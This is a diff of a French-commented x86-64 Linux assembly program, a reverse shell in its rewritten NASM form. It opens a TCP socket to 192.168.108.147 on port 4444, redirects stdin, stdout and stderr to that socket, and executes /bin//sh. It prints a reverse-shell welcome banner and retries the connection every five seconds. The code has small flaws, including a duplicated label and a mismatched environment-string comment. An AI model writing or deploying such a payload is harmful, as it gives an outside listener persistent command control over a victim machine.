@@ -1,108 +1,109 @@
-.section .data
-    ; Section pour les données initialisées
-    TARGET_IP:
-        .short 2            ; AF_INET (2 bytes)
-        .short 0x5c11       ; Port 4444 (0x5c11)
-        .long 0xc0a86c87    ; IP cible (192.168.108.135)
-        .zero 8             ; padding
-    
-    timespec:
-        .byte 5
-        .byte 0
+section .data
+TARGET_IP:
+    dw 2                    ; AF_INET (2 bytes)
+    dw 0x5c11               ; Port 4444 en network byte order
+    dd 0x936CA8C0           ; IP 192.168.108.147 en network byte order
+    times 8 db 0            ; padding pour sockaddr_in
 
-    ;============================
-    ; Socket section
-    ;============================
-    SYSCALL_SOCKET: .int 41
-    AF_INET: .int 2
-    SOCK_STREAM: .int 1     ;TCP
-    IP_PROTOCOL: .int 0
-    ;============================
-    ; Connect section
-    ;============================
-    SYSCALL_CONNECT: .int 42
-    SIZE_TARGET_IP: .int 16
+welcome_msg:
+    db "--------------------------------------------------", 0x0A
+    db "|          BIENVENUE DANS LE REVERSE SHELL       |", 0x0A
+    db "--------------------------------------------------", 0x0A
+    db 0
+welcome_len equ $ - welcome_msg
 
-.section .text
-    global _start
 
-; ----------------------------------
-; Point d'entrée, fonction principale
-; ----------------------------------
+timespec:
+    dd 5                    ; 5 secondes
+    dd 0                    ; 0 nanosecondes
+
+section .text
+global _start
+
 _start:
+    jmp main
 
-; ----------------------------------
-; Appel des fonctions
-; ----------------------------------
-; ----------------------------------
 main:
-
     call create_socket
+    test rax, rax
+    js error_handler        ; Vérification d'erreur socket
+    
     call connect
+    test rax, rax
+    js reconnect_if_fail    ; Vérification d'erreur connexion
+    
     call redir_io
     call shell
     call exit
-    
-; ----------------------------------
-; Création de la socket 
-; ----------------------------------
+
 create_socket:
-    mov rax, SYSCALL_SOCKET
-    mov rdi, AF_INET
-    mov rsi, SOCK_STREAM
-    mov rdx, IP_PROTOCOL
+    mov rax, 41             ; syscall socket
+    mov rdi, 2              ; AF_INET
+    mov rsi, 1              ; SOCK_STREAM
+    mov rdx, 0              ; IP_PROTOCOL
     syscall
-    mov rbx, rax        ; Stocke le descripteur de socket dans rbx
-; ----------------------------------
-; Connexion à la cible 
-; ----------------------------------
+    mov r12, rax            ; Stocker descripteur
+    ret
+
 connect:
-    mov rax, SYSCALL_CONNECT
-    mov rdi, rbx
-    lea rsi, [TARGET_IP]
-    mov rdx, SIZE_TARGET_IP
+    mov rax, 42             ; syscall connect
+    mov rdi, r12            ; descripteur socket
+    lea rsi, [rel TARGET_IP]; structure sockaddr_in
+    mov rdx, 16             ; taille structure
+    syscall
+    ret
+
+redir_io:
+    mov rsi, 0              ; stdin
+redir_loop:
+    mov rax, 33             ; syscall dup2
+    mov rdi, r12            ; descripteur socket
+    mov rdx, rsi
+    syscall
+    inc rsi                 ; stdout, stderr
+    cmp rsi, 3
+    jl redir_loop
+    ret
+
+shell:
+shell:
+    ; Affichage message
+    mov rax, 1              ; sys_write
+    mov rdi, 1              ; stdout (redirigé)
+    lea rsi, [rel welcome_msg]
+    mov rdx, welcome_len
     syscall
 
-; ----------------------------------
-; Redirection des entrées/sorties 
-; ----------------------------------
-redir_io:
-    mov rsi, 0        ; stdin
-    redir_loop:
-        mov rax, 33    ; dup2 (redirection socket reseau)
-        mov rdi, rbx   ; descripteur de socket
-        syscall
-        inc rsi        ; next: 1 (stdout), 2 (stderr)
-        cmp rsi, 3
-        jl redir_loop
+    ; Exécution shell avec PS1 personnalisé
+    xor rax, rax
+    push rax                ; NULL terminator
+    mov rbx, 0x68732f2f6e69622f  ; "/bin//sh"
+    push rbx
+    mov rdi, rsp            ; path
+    
+    ; Variables d'environnement
+    mov rax, 0x3d77243f24537d24  ; "PS1='\\w $ '"
+    push rax
+    lea rdx, [rsp]          ; envp
+    
+    xor rsi, rsi            ; argv = NULL
+    mov rax, 59             ; execve
+    syscall
 
-; ----------------------------------
-; Exécution du shell 
-; ----------------------------------
-shell:
 
-; ----------------------------------
-; Reconnexion auto toute les 5 secondes
-; ----------------------------------
+error_handler:
+    mov rax, 3              ; syscall close
+    mov rdi, r12
+    syscall
+
 reconnect_if_fail:
-    ; Si la connexion échoue, attendre 5 secondes
-    mov rax, 35         ; nanosleep
-    mov rdi, timespec   ; Structure pour le temps d'attente
+    mov rax, 35             ; syscall nanosleep
+    lea rdi, [rel timespec] ; attendre 5 secondes
     xor rsi, rsi
     syscall
+    jmp main                ; recommencer
 
-    ; Réessayer de se connecter
-    jmp connect         ; Retourne à la fonction de connexion
-
-; ----------------------------------
-; Gestion des erreurs
-; ----------------------------------
-error_handler:
-
-; ----------------------------------
-; Sortie 
-; ----------------------------------
 exit:
-    mov rax, 1          ; Code système pour terminer le programme
-    mov rbx, 0          ; Code de retour (0)
-    syscall             ; Appelle l'interruption pour quitter
+    mov rax, 60             ; syscall exit
+    mov rdi, 0
+    syscall
